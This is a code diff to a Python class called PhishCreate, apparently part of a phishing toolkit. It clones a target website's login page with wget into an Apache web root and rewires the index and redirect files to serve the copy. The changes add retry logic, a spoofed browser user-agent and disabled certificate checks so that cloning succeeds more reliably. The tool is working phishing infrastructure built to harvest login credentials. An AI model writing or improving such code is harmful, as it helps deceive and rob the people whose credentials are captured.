@@ -42,7 +42,13 @@ class PhishCreate:
             url = input(f"\n{GREEN} Please enter url of login page of website here:--> {RESET}")
             website_name = input(f"\n{GREEN} Please enter name for website to be saved in your computer. It could be random. :--> {RESET}")
             files_location = f'/var/www/html/'
-            self.clone_website(url,files_location,website_name)
+            while True:
+                output = self.clone_website(url,files_location,website_name)
+                if output == "ok":
+                    break
+                else:
+                    os.system("clear")
+                    url = input("[!] Could not clone to provided url. It could be not connected to internet or wrong url. Type the correct url again e.g 'https://example.com' -->")
             urls = self.homepage_website_url(website_name)
             self.configuring_redirecting_index_file(urls)
             self.configuring_main_index_file(self.main_url)
@@ -79,6 +85,7 @@ class PhishCreate:
         try:
             os.system("clear")
             print(f"\n {RED}[-][-]In order to configure your own website portal, Place all websites file in folder and Paste that folder in '/var/www/html' before running this program .{RESET}\n")
+            check = input("[+] Press any key after completing above step --> ")
             result = Sources().list_directory('/var/www/html')
             website = int(input(f"{BLUE}[+]Your apache websites directory contain following website. Select the website by typing corresponding number to create captive using that directory: -->{RESET}"))
             urls = self.homepage_website_url(result[website])
@@ -160,12 +167,18 @@ class PhishCreate:
 
     def clone_website(self,website,path,website_name):
         print(f"{GREEN}\n[+] Cloning login page::::{RESET}")
-        result = subprocess.run(f"wget -m -k -p '{website}' -P '{path}{website_name}'", shell=True, capture_output=True, text=True)
-        if website_name in Sources().list_directory(path):
+        result = subprocess.run(f"wget -m -k -p '{website}' -P '{path}{website_name}' --user-agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3' --no-check-certificate", shell=True, capture_output=True, text=True)
+        if "failed: Connection refused." in result.stderr or "failed: No route to host." in result.stderr or "failed: Name or service not known." in result.stderr and "Converted links in 0 files" in result.stderr:
+            time.sleep(1)
+            return ""
+        elif website_name in Sources().list_directory(path):
+            time.sleep(1)
             print(f"{GREEN}\n[+][+] Website is cloned Succussfully in folder name {website_name} !!!!!!!{RESET}")
+            return "ok"       
         else:
+            time.sleep(1)
             print(f"{RED}\n[-][-] Due to some issues, website could not cloned successfully. Try Again by starting from beginning ---- {RESET}")
-        time.sleep(1)
+            return ""
 
     def homepage_website_url(self,website):
         url = f"/var/www/html/{website}"
